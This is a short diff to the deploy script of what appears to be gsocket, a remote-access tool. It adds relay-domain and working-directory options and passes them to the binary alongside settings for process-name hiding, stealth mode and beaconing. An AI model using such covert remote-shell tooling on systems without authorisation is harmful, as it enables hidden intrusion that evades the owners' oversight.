@@ -70,6 +70,10 @@
 #       - See https://github.com/hackerschoice/gsocket-relay
 # GS_PORT=
 #       - Port for the GSRN-Server. Default is 443.
+# GS_DOMAIN=
+#       - use [a-z].gz.<GS_DOMAIN> to resolve relay addresses.
+# GS_WORKDIR=
+#       - Set the HOME directory (e.g. try GS_WORKDIR=/dev/shm).
 # _GS_TMPDIR=
 #       - Guess what...
 
@@ -1232,7 +1236,7 @@ config2bin() {
 		cp -p "${src}" "${dst}" || return 255
 	}
 
-	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
